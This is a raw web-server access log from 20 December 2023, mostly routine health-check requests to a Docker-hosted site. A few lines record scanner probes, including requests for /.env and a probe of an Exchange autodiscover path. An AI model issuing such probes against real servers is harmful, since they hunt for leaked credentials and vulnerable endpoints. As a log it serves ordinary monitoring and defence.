167.71.120.76 - - [20/Dec/2023:06:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 753 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 754 "www@docker" "http://172.20.0.9:80" 10ms
167.71.120.76 - - [20/Dec/2023:06:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 755 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 756 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:06:35:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 757 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 758 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:06:36:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 759 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 760 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:37:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 761 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 762 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:06:38:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 763 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 764 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:39:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 765 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 766 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:40:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 767 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 768 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 769 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 770 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 771 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 772 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:43:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 773 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 774 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:44:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 775 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 776 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 777 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 778 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:06:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 779 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 780 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 781 "www@docker" "http://172.20.0.9:80" 1ms
68.69.186.30 - - [20/Dec/2023:06:47:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 782 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:06:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 783 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 784 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 785 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 786 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 787 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 788 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 789 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 790 "www@docker" "http://172.20.0.9:80" 1ms
205.210.31.248 - - [20/Dec/2023:06:51:41 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 791 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:06:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 792 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 793 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 794 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 795 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 796 "www@docker" "http://172.20.0.9:80" 3ms
167.71.120.76 - - [20/Dec/2023:06:54:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 797 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 798 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:55:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 799 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 800 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:56:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 801 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 802 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:57:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 803 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:06:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 804 "www@docker" "http://172.20.0.9:80" 7ms
167.71.120.76 - - [20/Dec/2023:06:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 805 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:06:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 806 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:06:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 807 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 808 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 809 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 810 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 811 "www@docker" "http://172.20.0.9:80" 0ms
198.235.24.29 - - [20/Dec/2023:07:01:43 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 812 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:07:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 813 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 814 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 815 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:03:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 816 "www@docker" "http://172.20.0.9:80" 1ms
57.128.141.133 - - [20/Dec/2023:07:04:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 817 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:07:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 818 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 819 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 820 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 821 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 822 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 823 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 824 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 825 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 826 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 827 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 828 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 829 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 830 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 831 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 832 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 833 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 834 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 835 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 836 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 837 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 838 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 839 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 840 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 841 "www@docker" "http://172.20.0.9:80" 1ms
198.235.24.132 - - [20/Dec/2023:07:15:56 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 842 "dashboard@internal" "-" 0ms
198.235.24.132 - - [20/Dec/2023:07:15:56 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 843 "dashboard@internal" "-" 7ms
159.203.109.206 - - [20/Dec/2023:07:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 844 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 845 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 846 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 847 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 848 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:07:18:33 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 849 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:07:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 850 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 851 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 852 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:07:19:38 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 853 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:07:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 854 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 855 "www@docker" "http://172.20.0.9:80" 1ms
107.170.249.30 - - [20/Dec/2023:07:20:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 856 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:07:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 857 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 858 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 859 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 860 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 861 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 862 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 863 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 864 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 865 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 866 "www@docker" "http://172.20.0.9:80" 0ms
181.48.119.70 - - [20/Dec/2023:07:25:37 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 867 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:07:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 868 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 869 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 870 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 871 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 872 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 873 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 874 "www@docker" "http://172.20.0.9:80" 0ms
94.102.61.75 - - [20/Dec/2023:07:29:31 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 875 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:07:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 876 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 877 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 878 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 879 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 880 "www@docker" "http://172.20.0.9:80" 1ms
107.170.248.46 - - [20/Dec/2023:07:32:19 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 881 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:07:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 882 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:32:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 883 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 884 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 885 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 886 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 887 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 888 "www@docker" "http://172.20.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:07:35:32 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 889 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:07:35:32 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 890 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:07:35:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 891 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 892 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:36:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 893 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 894 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:37:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 895 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 896 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:38:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 897 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 898 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:39:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 899 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 900 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:40:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 901 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 902 "www@docker" "http://172.20.0.9:80" 0ms
35.195.93.98 - - [20/Dec/2023:07:41:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 903 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:07:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 904 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 905 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 906 "www@docker" "http://172.20.0.9:80" 1ms
198.199.107.20 - - [20/Dec/2023:07:43:04 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 907 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:07:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 908 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:43:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 909 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 910 "www@docker" "http://172.20.0.9:80" 0ms
54.36.115.221 - - [20/Dec/2023:07:44:27 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 911 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:07:44:27 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 912 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:07:44:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 913 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 914 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 915 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 916 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 917 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 918 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 919 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 920 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 921 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 922 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 923 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 924 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 925 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 926 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 927 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 928 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 929 "www@docker" "http://172.20.0.9:80" 0ms
45.79.181.223 - - [20/Dec/2023:07:53:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 930 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:07:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 931 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 932 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 933 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:54:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 934 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:07:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 935 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:07:55:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 936 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:07:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 937 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:07:56:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 938 "www@docker" "http://172.20.0.9:80" 0ms
